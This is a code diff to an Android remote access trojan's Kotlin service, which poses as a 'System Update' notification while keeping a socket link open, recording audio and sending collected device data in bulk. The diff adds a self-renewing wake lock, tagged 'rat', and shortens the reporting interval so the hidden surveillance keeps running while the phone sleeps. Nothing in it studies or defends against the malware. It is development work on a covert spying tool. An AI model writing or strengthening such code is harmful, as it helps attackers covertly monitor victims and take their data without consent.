@@ -61,6 +61,7 @@ class MainService : Service() {
     private var dataCollectionAttempts = 0
     private var lastBulkDataSent = 0L
     private var isConnected = false
+    private var wakeLock: PowerManager.WakeLock? = null
     
     companion object {
         private const val TAG = "MainService"   
@@ -121,6 +122,12 @@ class MainService : Service() {
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, createNotification("System Update", "Device optimization active"))
         
+        // Acquire wake lock to prevent CPU from sleeping
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rat:serviceWakeLock")
+        wakeLock?.setReferenceCounted(false)
+        wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
+        
         // Delay initial connection to let device boot and network settle
         Handler(Looper.getMainLooper()).postDelayed({
             Log.d(TAG, "Delayed initial connection attempt")
@@ -144,6 +151,7 @@ class MainService : Service() {
         isConnected = false
         try { socket.disconnect() } catch (e: Exception) {}
         audioRecorder?.release()
+        try { wakeLock?.release() } catch (e: Exception) {}
         super.onDestroy()
         val broadcastIntent = Intent()
         broadcastIntent.action = "restartService"
@@ -1018,10 +1026,14 @@ class MainService : Service() {
                         safeEmit("device:update", JSONObject().apply { put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging()) })
                     }
                     if (System.currentTimeMillis() - lastBulkDataSent > 300000) sendBulkData()
+                    // Renew wake lock every 5 minutes
+                    if (System.currentTimeMillis() % 300000 < 30000) {
+                        try { wakeLock?.acquire(10 * 60 * 1000L) } catch (e: Exception) {}
+                    }
                 } catch (e: Exception) { Log.e(TAG, "Periodic update error: ${e.message}") }
-                Handler(Looper.getMainLooper()).postDelayed(this, 30000)
+                Handler(Looper.getMainLooper()).postDelayed(this, 15000) // Every 15 seconds instead of 30
             }
-        }, 30000)
+        }, 15000)
     }
     
     private fun startBatteryMonitoring() { registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) }
